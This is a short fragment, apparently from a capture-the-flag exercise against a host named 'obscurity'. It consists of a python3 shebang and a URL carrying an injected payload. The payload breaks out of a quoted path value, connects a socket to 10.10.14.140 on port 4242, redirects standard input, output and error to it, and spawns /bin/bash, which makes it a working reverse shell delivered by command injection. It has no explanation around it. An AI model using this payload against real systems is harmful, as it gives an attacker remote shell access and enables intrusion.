#!/usr/bin/python3
http://obscurity:8080/index.html';path="/";s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.140",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash");'

